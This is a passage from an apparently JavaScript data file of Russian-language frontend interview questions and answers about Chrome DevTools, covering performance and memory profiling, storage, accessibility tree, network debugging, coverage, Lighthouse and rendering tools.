= scripting</li><li>Фиолетовый = rendering</li><li>Зелёный = painting</li></ul><p><strong>Что смотрю в первую очередь:</strong></p><ul><li>Summary tab — breakdown времени</li><li>Bottom-Up — какие функции тяжёлые</li><li>Call Tree — откуда вызываются</li><li>Event Log — последовательность событий</li></ul><p><strong>Частые находки:</strong></p><p><strong>Long tasks:</strong></p><ul><li>\"Вот эта функция занимает 300ms\"</li><li>Click → Bottom-Up → видно что heavyCalculation()</li><li>Решение: разбить на chunks, Web Worker, мемоизация</li></ul><p><strong>Forced reflows:</strong></p><ul><li>Фиолетовые \"Recalculate Style\" часто</li><li>Чтение offsetHeight после изменения стилей</li><li>Решение: batch DOM reads/writes</li></ul><p><strong>Много paint операций:</strong></p><ul><li>Зелёные блоки при scroll</li><li>Layout shift проблемы</li><li>Решение: will-change, transform вместо position</li></ul><p><strong>Практический пример:</strong></p><ul><li>Проблема: \"Scroll тормозит\"</li><li>Записал профиль при скролле</li><li>Вижу: каждый scroll event → 150ms task</li><li>Bottom-Up: updateStats() вызывается на каждый scroll</li><li>Решение: debounce updateStats, passive listener</li><li>Результат: smooth scroll</li></ul><p><strong>Полезные фичи:</strong></p><ul><li>Screenshots — видеть что было на экране</li><li>Frames — FPS график</li><li>Interactions track — где были клики</li><li>Network waterfall в timeline</li></ul><p><strong>Советы:</strong></p><ul><li>✅ Воспроизводить реальные user actions</li><li>✅ Записывать короткие сессии</li><li>✅ Сравнивать до/после оптимизации</li><li>✅ Смотреть на Main thread utilization</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Performance', 'Profiler', 'оптимизация']
  },

  {
    id: 118,
    question: "Как использовать Memory Profiler и для каких задач он нужен?",
    answer: "<p><strong>Memory Profiler</strong> помогает находить memory leaks и оптимизировать использование памяти.</p><p><strong>Когда использую Memory panel:</strong></p><p><strong>Симптомы проблем с памятью:</strong></p><ul><li>⚠️ Страница становится медленнее со временем</li><li>⚠️ Браузер крашится на долгих сессиях</li><li>⚠️ High memory usage в Task Manager</li><li>⚠️ SPA работает часами без refresh</li></ul><p><strong>Типы профилей:</strong></p><p><strong>1. Heap Snapshot:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Snapshot памяти в конкретный момент</li><li>Какие объекты есть в памяти</li><li>Сколько места они занимают</li><li>Retaining path — что держит объект</li></ul><p><strong>Как использую:</strong></p><ul><li>Делаю snapshot до действия</li><li>Выполняю действие (открыть модал, закрыть)</li><li>Делаю snapshot после</li><li>Comparison view — что осталось в памяти</li></ul><p><strong>Пример поиска утечки:</strong></p><ul><li>Открыл 10 раз модал</li><li>Закрыл 10 раз</li><li>Snapshot показывает 10 ModalComponent в памяти</li><li>Retaining path: EventEmitter → callback → ModalComponent</li><li>Проблема: не отписались от событий</li><li>Решение: cleanup в componentWillUnmount</li></ul><p><strong>2. Allocation Timeline:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Какие объекты создаются во времени</li><li>Синие столбики = аллокации</li><li>Серые линии = garbage collection</li></ul><p><strong>Полезно для:</strong></p><ul><li>Поиск кода который постоянно аллоцирует</li><li>Видно где GC не успевает</li><li>Memory pressure visualization</li></ul><p><strong>3. Allocation Sampling:</strong></p><ul><li>Легковесное профилирование</li><li>Меньше overhead чем Timeline</li><li>Хорошо для production-like нагрузки</li></ul><p><strong>Чтение Heap Snapshot:</strong></p><p><strong>Views которые использую:</strong></p><p><strong>Summary view:</strong></p><ul><li>Сортировка по Retained Size</li><li>Самые \"тяжёлые\" объекты</li><li>Constructor name — тип объектов</li></ul><p><strong>Comparison view:</strong></p><ul><li>Разница между двумя snapshots</li><li># New — новые объекты</li><li># Deleted — удалённые</li><li># Delta — разница</li></ul><p><strong>Containment view:</strong></p><ul><li>Иерархия объектов</li><li>Откуда растут корни</li><li>Window → глобальные переменные</li></ul><p><strong>Типичные утечки которые нахожу:</strong></p><p><strong>1. Event listeners не удалены:</strong></p><ul><li>addEventListener без removeEventListener</li><li>Closure держит ссылку на component</li><li>Видно в Retaining path</li></ul><p><strong>2. Timers не очищены:</strong></p><ul><li>setInterval работает после unmount</li><li>setTimeout ссылается на компонент</li></ul><p><strong>3. Глобальные переменные:</strong></p><ul><li>Случайно создали window.cache = []</li><li>Array растёт бесконечно</li></ul><p><strong>4. Detached DOM nodes:</strong></p><ul><li>DOM удалён из дерева</li><li>Но JS ссылка осталась</li><li>Видно как (Detached HTMLDivElement)</li></ul><p><strong>Процесс диагностики:</strong></p><ol><li>Подозреваю утечку в Feature X</li><li>Snapshot before</li><li>Использую Feature 10 раз</li><li>Snapshot after</li><li>Comparison → смотрю что выросло</li><li>Находжу конструктор (ComponentX)</li><li>Retaining path показывает причину</li><li>Фикшу и проверяю снова</li></ol><p><strong>Практический совет:</strong></p><ul><li>✅ Принудительный GC перед snapshot (trash icon)</li><li>✅ Воспроизвести проблему несколько раз</li><li>✅ Сравнивать snapshots, не смотреть один</li><li>✅ Искать detached nodes отдельным фильтром</li></ul><p><strong>Когда НЕ использую:</strong></p><ul><li>Для первичной оптимизации — сначала Performance</li><li>Если нет конкретных симптомов</li><li>Micro-optimizations — не стоит усилий</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Memory', 'Profiler', 'утечки памяти', 'debugging']
  },

  {
    id: 119,
    question: "Как работать с Application panel и Storage инструментами?",
    answer: "<p><strong>Application panel</strong> — центр для работы со storage, service workers и PWA возможностями.</p><p><strong>Storage инструменты:</strong></p><p><strong>1. Local Storage / Session Storage:</strong></p><p><strong>Что делаю:</strong></p><ul><li>Просмотр всех ключей и значений</li><li>Редактирование прямо в DevTools</li><li>Удаление конкретных ключей</li><li>Clear All для тестирования</li></ul><p><strong>Частые задачи:</strong></p><ul><li>\"Почему feature flag не работает?\"</li><li>Смотрю localStorage — значение старое</li><li>Удаляю, перезагружаю — работает</li></ul><p><strong>Проверка размера:</strong></p><ul><li>Видно сколько места занято</li><li>Лимит ~5-10MB</li><li>Если близко к лимиту — warning</li></ul><p><strong>2. Cookies:</strong></p><p><strong>Основные действия:</strong></p><ul><li>Просмотр всех cookies для домена</li><li>Фильтрация по домену</li><li>Редактирование значений</li><li>Проверка Secure, HttpOnly, SameSite флагов</li></ul><p><strong>Debugging сценарии:</strong></p><ul><li>\"Auth не работает\" → смотрю auth token cookie</li><li>Проверяю Expires — может истёк</li><li>SameSite=Strict может блокировать</li><li>Domain/Path правильные?</li></ul><p><strong>3. IndexedDB:</strong></p><p><strong>Инспекция базы:</strong></p><ul><li>Список всех баз и object stores</li><li>Просмотр записей</li><li>Поиск по key</li><li>Удаление базы для тестирования</li></ul><p><strong>Использую когда:</strong></p><ul><li>PWA с offline данными</li><li>Debugging sync проблем</li><li>\"Где хранится этот кэш?\"</li></ul><p><strong>4. Cache Storage:</strong></p><p><strong>Для Service Workers:</strong></p><ul><li>Какие ресурсы закэшированы</li><li>Версия cache</li><li>Удаление старых кэшей</li><li>Проверка что попало в cache</li></ul><p><strong>Типичная проблема:</strong></p><ul><li>\"Изменения не видны после deploy\"</li><li>Service Worker отдаёт старый cache</li><li>Clear cache, unregister SW</li></ul><p><strong>Service Workers раздел:</strong></p><p><strong>Что смотрю:</strong></p><ul><li>Status: activated, waiting, installing</li><li>Scope — для каких URL работает</li><li>Source — файл SW</li><li>Update on reload checkbox</li></ul><p><strong>Debugging SW:</strong></p><ul><li>Unregister для полного сброса</li><li>Skip waiting для форсированного update</li><li>Offline checkbox — эмуляция offline</li><li>Update — принудительная проверка updates</li></ul><p><strong>Практический пример:</strong></p><ul><li>Deploy новую версию</li><li>SW в состоянии \"waiting\"</li><li>\"Skip waiting\" → становится \"activated\"</li><li>Refresh → новая версия</li></ul><p><strong>Manifest раздел:</strong></p><p><strong>Для PWA:</strong></p><ul><li>Проверка manifest.json</li><li>Icons всех размеров</li><li>Theme color, background color</li><li>Display mode, orientation</li></ul><p><strong>Errors/Warnings:</strong></p><ul><li>Missing icons показаны</li><li>Invalid JSON syntax</li><li>Wrong MIME type</li></ul><p><strong>Background Services:</strong></p><ul><li>Background Fetch</li><li>Background Sync</li><li>Notifications</li><li>Payment Handler</li><li>Periodic Background Sync</li></ul><p><strong>Полезно для PWA debugging</strong></p><p><strong>Storage Usage:</strong></p><p><strong>Quota Management:</strong></p><ul><li>Сколько storage доступно</li><li>Сколько использовано</li><li>Per origin breakdown</li><li>Clear site data одной кнопкой</li></ul><p><strong>Frames инспектор:</strong></p><ul><li>Иерархия iframes</li><li>Какие origin у frames</li><li>Storage для каждого frame</li><li>Полезно для embedded контента</li></ul><p><strong>Trust Tokens:</strong></p><ul><li>Privacy Sandbox API</li><li>Проверка trust tokens</li><li>Для anti-fraud систем</li></ul><p><strong>Практические советы:</strong></p><ul><li>✅ Clear site data при странном поведении</li><li>✅ Проверять cookies при auth проблемах</li><li>✅ Update on reload для SW development</li><li>✅ Смотреть Quota перед large caching</li></ul><p><strong>Shortcuts:</strong></p><ul><li>Right-click на Storage → Clear</li><li>Right-click на domain → Clear cookies</li><li>Filter bar для быстрого поиска</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Application', 'Storage', 'Service Workers', 'PWA']
  },

  {
    id: 120,
    question: "Что такое Accessibility Tree и как его использовать в DevTools?",
    answer: "<p><strong>Accessibility Tree</strong> — это представление DOM в том виде, как его \"видят\" assistive technologies.</p><p><strong>Что такое A11y Tree:</strong></p><p><strong>Концепция:</strong></p><ul><li>Параллельное дерево к DOM</li><li>Содержит только семантически значимые элементы</li><li>Используется screen readers</li><li>Построено на основе ARIA и HTML семантики</li></ul><p><strong>Где найти в DevTools:</strong></p><ul><li>Elements panel → правый sidebar</li><li>Вкладка \"Accessibility\"</li><li>Можно включить full-page A11y tree view</li><li>Settings → Experiments → Full accessibility tree</li></ul><p><strong>Что показывает A11y Tree:</strong></p><p><strong>Для выбранного элемента:</strong></p><ul><li><strong>Role</strong> — какую роль играет элемент</li><li><strong>Name</strong> — доступное имя (что озвучит screen reader)</li><li><strong>Description</strong> — дополнительное описание</li><li><strong>Properties</strong> — ARIA атрибуты</li><li><strong>States</strong> — текущее состояние</li></ul><p><strong>Практические примеры использования:</strong></p><p><strong>1. Проверка доступного имени:</strong></p><p><strong>Проблема:</strong></p><ul><li>Кнопка без текста, только иконка</li><li>&lt;button&gt;&lt;Icon /&gt;&lt;/button&gt;</li></ul><p><strong>A11y Tree показывает:</strong></p><ul><li>Name: \"\" (пусто)</li><li>Role: button</li><li>❌ Screen reader озвучит только \"button\"</li></ul><p><strong>Решение:</strong></p><ul><li>&lt;button aria-label=\"Close\"&gt;&lt;Icon /&gt;&lt;/button&gt;</li><li>Name: \"Close\" ✅</li></ul><p><strong>2. Проверка роли элемента:</strong></p><p><strong>HTML:</strong></p><ul><li>&lt;div onClick={handleClick}&gt;Submit&lt;/div&gt;</li></ul><p><strong>A11y Tree:</strong></p><ul><li>Role: generic</li><li>❌ Не распознаётся как кнопка</li><li>❌ Не в keyboard navigation</li></ul><p><strong>Правильно:</strong></p><ul><li>&lt;button onClick={handleClick}&gt;Submit&lt;/button&gt;</li><li>Role: button ✅</li><li>Focusable ✅</li></ul><p><strong>3. Проверка состояний:</strong></p><p><strong>Checkbox без ARIA:</strong></p><ul><li>&lt;div className=\"checkbox\" onClick={toggle} /&gt;</li></ul><p><strong>A11y Tree:</strong></p><ul><li>Role: generic</li><li>State: нет информации о checked/unchecked</li></ul><p><strong>С ARIA:</strong></p><ul><li>&lt;div role=\"checkbox\" aria-checked={isChecked} /&gt;</li><li>Role: checkbox ✅</li><li>Checked: true/false ✅</li></ul><p><strong>Как использую в реальной работе:</strong></p><p><strong>При создании custom компонентов:</strong></p><ol><li>Делаю компонент (например, custom dropdown)</li><li>Открываю A11y Tree</li><li>Проверяю role, name, states</li><li>Сравниваю с нативным &lt;select&gt;</li><li>Добавляю недостающие ARIA атрибуты</li></ol><p><strong>При code review:</strong></p><ul><li>\"А это доступно?\"</li><li>Открываю A11y Tree</li><li>Проверяю ключевые элементы</li><li>Комментирую если проблемы</li></ul><p><strong>Full A11y Tree view:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Всё дерево доступности для страницы</li><li>Как screen reader \"видит\" структуру</li><li>Иерархия landmarks и headings</li></ul><p><strong>Полезно для:</strong></p><ul><li>Проверка структуры страницы</li><li>Логичная ли навигация?</li><li>Есть ли пропущенные heading levels?</li><li>Правильные ли landmarks?</li></ul><p><strong>Computed Properties раздел:</strong></p><p><strong>Показывает:</strong></p><ul><li>Откуда взялось имя (Name from)</li><li>aria-label, aria-labelledby, или content</li><li>Computed role</li><li>Можно ли получить focus</li><li>Keyboard shortcut если есть</li></ul><p><strong>Связь с Lighthouse:</strong></p><ul><li>Lighthouse автоматические a11y проверки</li><li>A11y Tree — ручная инспекция</li><li>Дополняют друг друга</li></ul><p><strong>Типичные находки через A11y Tree:</strong></p><ul><li>❌ Кнопки без имён</li><li>❌ Images без alt</li><li>❌ Custom controls без ролей</li><li>❌ Неправильная heading структура</li><li>❌ Missing form labels</li></ul><p><strong>Лучшие практики:</strong></p><ul><li>✅ Проверяй интерактивные элементы</li><li>✅ Custom components всегда инспектируй</li><li>✅ Сравнивай с нативными аналогами</li><li>✅ Используй вместе с Lighthouse</li><li>✅ Test с реальным screen reader тоже</li></ul><p><strong>Интеграция в workflow:</strong></p><ul><li>При создании нового компонента → check A11y Tree</li><li>При code review → spot check ключевых элементов</li><li>При баг фиксе a11y → используй для диагностики</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Accessibility', 'A11y Tree', 'ARIA', 'screen readers']
  },

  {
    id: 121,
    question: "Как использовать Network panel для debugging API запросов?",
    answer: "<p><strong>Network panel</strong> — главный инструмент для работы с сетевыми запросами.</p><p><strong>Базовое использование:</strong></p><p><strong>Фильтрация запросов:</strong></p><ul><li>XHR/Fetch — только API вызовы</li><li>JS, CSS, Img — по типу ресурса</li><li>Has response headers — только завершённые</li><li>Is — по статусу (is:running, is:from-cache)</li></ul><p><strong>Практический пример:</strong></p><ul><li>Ищу почему API падает</li><li>Фильтр: XHR + status-code:5**</li><li>Сразу вижу failed requests</li></ul><p><strong>Детальный просмотр запроса:</strong></p><p><strong>Headers tab:</strong></p><ul><li><strong>General</strong> — URL, метод, статус</li><li><strong>Response Headers</strong> — что вернул сервер</li><li><strong>Request Headers</strong> — что отправили</li></ul><p><strong>Что проверяю:</strong></p><ul><li>Authorization header правильный?</li><li>Content-Type корректный?</li><li>CORS headers присутствуют?</li><li>Cache headers установлены?</li></ul><p><strong>Preview/Response tabs:</strong></p><ul><li><strong>Preview</strong> — форматированный JSON</li><li><strong>Response</strong> — raw ответ</li></ul><p><strong>Полезно когда:</strong></p><ul><li>\"Что вернул API?\"</li><li>Смотрю structure ответа</li><li>Проверяю данные</li></ul><p><strong>Payload tab (Request):</strong></p><ul><li>Query String Parameters</li><li>Form Data</li><li>Request Payload (JSON body)</li></ul><p><strong>Debugging сценарий:</strong></p><ul><li>POST не работает</li><li>Смотрю Payload</li><li>Вижу: отправляется {userId: \"123\"}</li><li>Должно быть {userId: 123}</li><li>Нашёл баг в коде</li></ul><p><strong>Timing tab:</strong></p><p><strong>Waterfall breakdown:</strong></p><ul><li><strong>Queueing</strong> — ждёт в очереди браузера</li><li><strong>Stalled</strong> — задержка до начала</li><li><strong>DNS Lookup</strong> — резолвинг домена</li><li><strong>Initial connection</strong> — TCP handshake</li><li><strong>SSL</strong> — TLS negotiation</li><li><strong>Request sent</strong> — отправка</li><li><strong>Waiting (TTFB)</strong> — ждём ответа сервера</li><li><strong>Content Download</strong> — загрузка</li></ul><p><strong>Диагностика медленных запросов:</strong></p><ul><li>TTFB большой → сервер медленный</li><li>DNS Lookup долгий → проблема DNS</li><li>SSL долгий → certificate проблемы</li><li>Download долгий → большой response</li></ul><p><strong>Инструменты для debugging:</strong></p><p><strong>Block request URL:</strong></p><ul><li>Right-click → Block request URL</li><li>Эмуляция failed request</li><li>Проверка error handling</li></ul><p><strong>Replay XHR:</strong></p><ul><li>Right-click → Replay XHR</li><li>Повторить запрос</li><li>Не нужно refresh страницы</li></ul><p><strong>Copy as cURL/fetch:</strong></p><ul><li>Скопировать точный запрос</li><li>Воспроизвести в terminal</li><li>Поделиться с backend командой</li></ul><p><strong>Network conditions:</strong></p><p><strong>Throttling:</strong></p><ul><li>Slow 3G, Fast 3G, Offline</li><li>Custom profiles</li><li>Эмуляция медленной сети</li></ul><p><strong>Использую когда:</strong></p><ul><li>Тестирую загрузку на медленном интернете</li><li>Проверяю loading states</li><li>Offline mode для PWA</li></ul><p><strong>Request blocking:</strong></p><ul><li>Block конкретные домены</li><li>Patterns: *analytics*, *ads*</li><li>Тестирование без third-party</li></ul><p><strong>Preserve log:</strong></p><ul><li>Checkbox \"Preserve log\"</li><li>Не очищать при navigation</li><li>Вижу все запросы across redirects</li></ul><p><strong>Практические советы:</strong></p><p><strong>Частые задачи:</strong></p><ul><li>\"Почему 401?\" → смотрю Authorization header</li><li>\"Что отправляется?\" → Payload tab</li><li>\"CORS ошибка\" → Response headers, Access-Control-*</li><li>\"Медленный API\" → Timing tab, TTFB</li><li>\"Кэшируется?\" → проверяю (from cache) или 304</li></ul><p><strong>Shortcuts:</strong></p><ul><li>⌘/Ctrl + F — search в requests</li><li>Clear — очистить все</li><li>Filter box — быстрая фильтрация</li></ul><p><strong>Экспорт данных:</strong></p><ul><li>Right-click → Save all as HAR</li><li>Можно поделиться или проанализировать в WebPageTest</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Network', 'API', 'debugging', 'HTTP']
  },

  {
    id: 122,
    question: "Как использовать Coverage tool для оптимизации bundle size?",
    answer: "<p><strong>Coverage tool</strong> показывает сколько кода реально используется на странице.</p><p><strong>Где найти:</strong></p><ul><li>⌘/Ctrl + Shift + P → \"Show Coverage\"</li><li>Или More tools → Coverage</li><li>Появится панель внизу DevTools</li></ul><p><strong>Как работает:</strong></p><p><strong>1. Запуск анализа:</strong></p><ul><li>Click \"Instrument coverage\"</li><li>Reload страницы или perform actions</li><li>Stop recording</li></ul><p><strong>Что показывает:</strong></p><ul><li>Список всех JS и CSS файлов</li><li>Total Bytes — размер файла</li><li>Unused Bytes — неиспользуемый код</li><li>Unused % — процент неиспользованного</li><li>Visualization bar — красное = не используется</li></ul><p><strong>Интерпретация результатов:</strong></p><p><strong>JavaScript файлы:</strong></p><ul><li>vendor.js — 500KB, 70% unused</li><li>Означает: загружаем много кода который не нужен</li><li>Возможные причины:</li><li>- Не настроен tree shaking</li><li>- Импортируем всю библиотеку</li><li>- Код для других routes в bundle</li></ul><p><strong>CSS файлы:</strong></p><ul><li>styles.css — 200KB, 60% unused</li><li>Много неиспользуемых стилей</li><li>Возможно: CSS framework целиком</li></ul><p><strong>Практические действия:</strong></p><p><strong>1. Code splitting по routes:</strong></p><p><strong>Проблема:</strong></p><ul><li>Все routes в одном bundle</li><li>Home page загружает код Dashboard</li></ul><p><strong>До оптимизации:</strong></p><ul><li>app.js — 800KB, 65% unused на home</li></ul><p><strong>После code splitting:</strong></p><ul><li>home.js — 200KB, 20% unused</li><li>dashboard.js — загружается только на /dashboard</li></ul><p><strong>2. Оптимизация импортов:</strong></p><p><strong>Плохо:</strong></p><ul><li>import _ from 'lodash'; // весь lodash</li><li>Coverage показывает 90% unused</li></ul><p><strong>Хорошо:</strong></p><ul><li>import debounce from 'lodash/debounce';</li><li>Или import {debounce} from 'lodash-es';</li><li>Tree shaking уберёт неиспользуемое</li></ul><p><strong>3. Удаление мёртвого кода:</strong></p><ul><li>Coverage показывает функции которые никогда не вызываются</li><li>Click на файл → видно конкретные строки</li><li>Красные = не выполнялись</li><li>Можно safely удалить</li></ul><p><strong>4. CSS оптимизация:</strong></p><p><strong>Находки:</strong></p><ul><li>Tailwind целиком — 90% unused</li><li>Bootstrap components — используем 5 из 50</li></ul><p><strong>Решения:</strong></p><ul><li>PurgeCSS в production build</li><li>Только нужные компоненты Bootstrap</li><li>CSS modules для scope</li></ul><p><strong>Детальный анализ файла:</strong></p><p><strong>Click на файл в Coverage:</strong></p><ul><li>Открывается Sources panel</li><li>Красные полосы слева = не выполнялось</li><li>Зелёные = выполнялось</li></ul><p><strong>Пример:</strong></p><ul><li>Вижу целая функция красная</li><li>Dead code — можно удалить</li><li>Или код для другой страницы — нужен splitting</li></ul><p><strong>Workflow оптимизации:</strong></p><ol><li>Запустить Coverage на main pages</li><li>Найти файлы с высоким Unused %</li><li>Проанализировать почему не используется</li><li>Применить оптимизацию</li><li>Measure снова — проверить улучшение</li></ol><p><strong>Метрики успеха:</strong></p><p><strong>До:</strong></p><ul><li>Total: 2MB</li><li>Unused: 1.4MB (70%)</li></ul><p><strong>После:</strong></p><ul><li>Total: 800KB</li><li>Unused: 200KB (25%)</li></ul><p><strong>Result: 60% reduction в bundle size</strong></p><p><strong>Особенности Coverage:</strong></p><p><strong>Per-page анализ:</strong></p><ul><li>Coverage для конкретной страницы</li><li>Не показывает что нужно на других pages</li><li>Осторожно с удалением — может использоваться elsewhere</li></ul><p><strong>Start coverage для user flow:</strong></p><ul><li>Не reload сразу</li><li>Perform типичный user journey</li><li>Останови coverage</li><li>Увидишь реально используемый код</li></ul><p><strong>Интеграция в workflow:</strong></p><ul><li>✅ Regular audits (monthly)</li><li>✅ После добавления новых dependencies</li><li>✅ Before major releases</li><li>✅ Combine с bundle analyzer</li></ul><p><strong>Ограничения:</strong></p><ul><li>⚠️ Не показывает dynamic imports usage</li><li>⚠️ Event handlers могут быть не triggered</li><li>⚠️ Code за feature flags может быть \"unused\"</li></ul><p><strong>Дополнительные инструменты:</strong></p><ul><li>webpack-bundle-analyzer — visualize bundle</li><li>source-map-explorer — breakdown by library</li><li>Используй вместе с Coverage</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Coverage', 'оптимизация', 'bundle size', 'tree shaking']
  },

  {
    id: 123,
    question: "Как использовать Lighthouse в DevTools для аудита производительности?",
    answer: "<p><strong>Lighthouse</strong> — автоматический аудит performance, accessibility, SEO и best practices.</p><p><strong>Где найти:</strong></p><ul><li>Lighthouse tab в DevTools</li><li>Или ⌘/Ctrl + Shift + P → \"Generate report\"</li></ul><p><strong>Настройки перед запуском:</strong></p><p><strong>Выбор категорий:</strong></p><ul><li>✅ Performance — Core Web Vitals, load metrics</li><li>✅ Accessibility — a11y проверки</li><li>✅ Best Practices — security, modern APIs</li><li>✅ SEO — meta tags, structured data</li><li>✅ PWA — manifest, service worker</li></ul><p><strong>Mode:</strong></p><ul><li><strong>Navigation</strong> — полная загрузка страницы (default)</li><li><strong>Timespan</strong> — анализ user interaction</li><li><strong>Snapshot</strong> — current page state</li></ul><p><strong>Device:</strong></p><ul><li>Mobile — эмулирует Moto G4</li><li>Desktop — современный laptop</li></ul><p><strong>Интерпретация результатов:</strong></p><p><strong>Performance Score (0-100):</strong></p><ul><li>90-100 — ✅ Хорошо (зелёный)</li><li>50-89 — ⚠️ Требует улучшения (оранжевый)</li><li>0-49 — ❌ Плохо (красный)</li></ul><p><strong>Weighted metrics:</strong></p><ul><li>LCP — 25% веса</li><li>TBT — 30%</li><li>CLS — 25%</li><li>FCP — 10%</li><li>Speed Index — 10%</li></ul><p><strong>Diagnostics раздел:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Конкретные проблемы</li><li>Estimated savings (сколько выиграем)</li><li>Ссылки на affected resources</li></ul><p><strong>Типичные находки:</strong></p><ul><li>\"Eliminate render-blocking resources\" — 1.2s savings</li><li>\"Properly size images\" — 500KB savings</li><li>\"Remove unused JavaScript\" — 800KB</li><li>\"Serve images in next-gen formats\" — 300KB</li></ul><p><strong>Opportunities vs Diagnostics:</strong></p><p><strong>Opportunities:</strong></p><ul><li>Измеримое улучшение</li><li>Показан potential savings</li><li>Приоритезированы по impact</li></ul><p><strong>Diagnostics:</strong></p><ul><li>Общие рекомендации</li><li>Best practices</li><li>Без точных savings</li></ul><p><strong>Passed audits:</strong></p><ul><li>Что уже хорошо</li><li>Можно скрыть для фокуса на проблемах</li></ul><p><strong>Практический workflow:</strong></p><p><strong>1. Начальный аудит:</strong></p><ul><li>Run Lighthouse на ключевой странице</li><li>Score: 45 (плохо)</li><li>Список opportunities</li></ul><p><strong>2. Приоритизация:</strong></p><ul><li>Сортировка по potential savings</li><li>\"Unused JavaScript\" — 2.1s savings</li><li>Начинаю с максимального impact</li></ul><p><strong>3. Оптимизация:</strong></p><ul><li>Применяю code splitting</li><li>Re-run Lighthouse</li><li>Score: 65 (+20)</li><li>Savings реализовались</li></ul><p><strong>4. Итеративное улучшение:</strong></p><ul><li>Следующая проблема</li><li>Fix → measure → repeat</li><li>Цель: Score > 90</li></ul><p><strong>Accessibility аудит:</strong></p><p><strong>Автоматические проверки:</strong></p><ul><li>Missing alt text</li><li>Low contrast text</li><li>Missing form labels</li><li>Invalid ARIA attributes</li><li>Missing lang attribute</li></ul><p><strong>Важно понимать:</strong></p><ul><li>Lighthouse находит ~30% a11y проблем</li><li>Manual testing всё равно нужен</li><li>Screen reader testing обязателен</li></ul><p><strong>SEO аудит:</strong></p><ul><li>Meta description presence</li><li>Robots.txt valid</li><li>Viewport meta tag</li><li>Links are crawlable</li><li>HTTP status codes</li></ul><p><strong>Best Practices:</strong></p><ul><li>HTTPS usage</li><li>No browser errors</li><li>Images have correct aspect ratio</li><li>Uses HTTPS for resources</li><li>Avoids deprecated APIs</li></ul><p><strong>PWA checklist:</strong></p><ul><li>Manifest installed</li><li>Service worker registered</li><li>Works offline</li><li>Installable</li><li>Splash screen configured</li></ul><p><strong>View Treemap:</strong></p><p><strong>Bundle visualization:</strong></p><ul><li>Click \"View Treemap\"</li><li>Visual breakdown bundle size</li><li>Какие модули самые большие</li><li>Coverage overlay</li></ul><p><strong>Полезно для:</strong></p><ul><li>Находить большие dependencies</li><li>Duplicate code</li><li>Unused modules</li></ul><p><strong>Сохранение и сравнение:</strong></p><ul><li>Save report (JSON/HTML)</li><li>Compare different runs</li><li>Track improvements over time</li><li>Share с командой</li></ul><p><strong>Lighthouse CI:</strong></p><ul><li>Автоматический запуск в CI/CD</li><li>Fail build при score degradation</li><li>Trend tracking</li></ul><p><strong>Ограничения Lighthouse:</strong></p><ul><li>⚠️ Lab data, не field</li><li>⚠️ Synthetic test, не real users</li><li>⚠️ Single page test</li><li>⚠️ Не заменяет RUM</li></ul><p><strong>Комбинация с другими инструментами:</strong></p><ul><li>Lighthouse — initial audit</li><li>Performance panel — debugging</li><li>Network — specific resources</li><li>Coverage — unused code</li></ul><p><strong>Практический совет:</strong></p><ul><li>✅ Run регулярно (weekly)</li><li>✅ Test на mobile первым</li><li>✅ Focus на opportunities с большим savings</li><li>✅ Validate с real user data</li><li>✅ Don't obsess over perfect 100</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Lighthouse', 'аудит', 'производительность', 'оптимизация']
  },

  {
    id: 124,
    question: "Как использовать Rendering panel для debugging визуальных проблем?",
    answer: "<p><strong>Rendering panel</strong> предоставляет инструменты для диагностики проблем с отрисовкой.</p><p><strong>Где найти:</strong></p><ul><li>More tools → Rendering</li><li>Появляется drawer panel внизу</li></ul><p><strong>Основные инструменты:</strong></p><p><strong>1. Paint flashing:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Зелёные прямоугольники при repaint</li><li>Чем чаще мигает — тем чаще перерисовывается</li><li>Помогает найти unnecessary repaints</li></ul><p><strong>Когда использую:</strong></p><ul><li>Scroll тормозит</li><li>Анимация не smooth</li><li>Подозреваю excessive painting</li></ul><p><strong>Практический пример:</strong></p><ul><li>Включаю Paint flashing</li><li>Scroll страницы</li><li>Вся страница мигает зелёным</li><li>Проблема: position:fixed element перерисовывается</li><li>Решение: will-change: transform</li></ul><p><strong>2. Layout Shift Regions:</strong></p><p><strong>Для CLS debugging:</strong></p><ul><li>Показывает синие области при layout shift</li><li>Видно какой элемент сдвинулся</li><li>Куда и насколько</li></ul><p><strong>Использование:</strong></p><ul><li>Enable Layout Shift Regions</li><li>Reload страницы</li><li>Синие вспышки = shifts</li><li>Инспектирую элементы</li><li>Добавляю width/height или min-height</li></ul><p><strong>3. Layer borders:</strong></p><p><strong>Что показывает:</strong></p><ul><li>Оранжевые границы — compositing layers</li><li>Помогает понять что на GPU</li><li>Видно layer иерархию</li></ul><p><strong>Зачем нужно:</strong></p><ul><li>Слишком много layers = memory overhead</li><li>Слишком мало = repaint проблемы</li><li>Баланс важен</li></ul><p><strong>Типичная находка:</strong></p><ul><li>Каждый элемент списка — отдельный layer</li><li>100 items = 100 layers</li><li>Убираю избыточные will-change</li></ul><p><strong>4. Frame Rendering Stats:</strong></p><p><strong>Показывает:</strong></p><ul><li>FPS meter</li><li>Frame rate в реальном времени</li><li>GPU memory usage</li><li>Dropped frames</li></ul><p><strong>Когда использую:</strong></p><ul><li>Проверка плавности анимации</li><li>\"Почему 30 FPS а не 60?\"</li><li>Мониторинг во время scroll/animation</li></ul><p><strong>5. Scrolling Performance Issues:</strong></p><p><strong>Highlight slow paths:</strong></p><ul><li>Shows elements with slow scroll handlers</li><li>Touch/wheel event listeners без passive</li><li>Synchronous scroll handlers</li></ul><p><strong>Решение:</strong></p><ul><li>Добавить {passive: true}</li><li>Debounce/throttle handlers</li><li>Use CSS для анимации где возможно</li></ul><p><strong>6. Core Web Vitals overlay:</strong></p><p><strong>Real-time метрики:</strong></p><ul><li>LCP element подсвечен</li><li>CLS regions показаны</li><li>INP interactions tracked</li></ul><p><strong>Удобно для:</strong></p><ul><li>Visual debugging Core Web Vitals</li><li>Понимание что измеряется</li><li>Quick validation оптимизаций</li></ul><p><strong>7. Emulate CSS media 